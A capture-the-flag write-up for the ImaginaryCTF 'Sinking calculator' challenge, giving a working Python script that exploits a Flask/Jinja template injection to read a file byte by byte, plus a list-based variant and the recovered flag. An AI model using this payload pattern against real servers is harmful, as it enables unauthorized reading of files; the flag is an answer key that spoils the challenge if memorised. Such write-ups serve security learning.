# Sinking calculator

## Task

My computer architecture professor told me: "Every time you see a decimal, you should hate it!" I took his advice to heart, and made a calculator. But don't worry! I got rid of all the decimals. No floats here!

Flag is in the file flag.

* [app.py](https://imaginaryctf.org/r/40A3-app.py)
* [sinking calculator](https://sinking-calculator.chal.imaginaryctf.org)

## Solution

Another Server Side Template Injection to abuse. This time our
output was limited to digits and negative signs. Also we only
had 80 characters to work with. My solution was to read the file
like in the build your website, but this time in binary mode
and then one byte at a time (Since the string representation of
a byte is a number)

```python
from requests import get
import sys

expl="a}}{{url_for.__globals__.__builtins__.open(\"flag\",\"rb\").read()[cur]"

for i in range(115):
    x = chr(int(get("https://sinking-calculator.chal.imaginaryctf.org/calc?query="+expl.replace("cur", str(i))).text))
    print(x,end="")
    sys.stdout.flush()
```

Another variant would've been to convert it to a list first, which
could be done by doing

`[].__class__(url_for.__globals__.__builtins__.open("flag","rb").read())`

then we get all the bytes at once, but without a separator, so
we'd need to work a bit to get the flag, but it's doable because
the only values below 100 would be in the range of 95 to 99.

and we get `ictf{this_flag_has_three_interesting_properties_it_has_no_numbers_or_dashes_it_is_quite_long_and_it_is_quite_scary}`
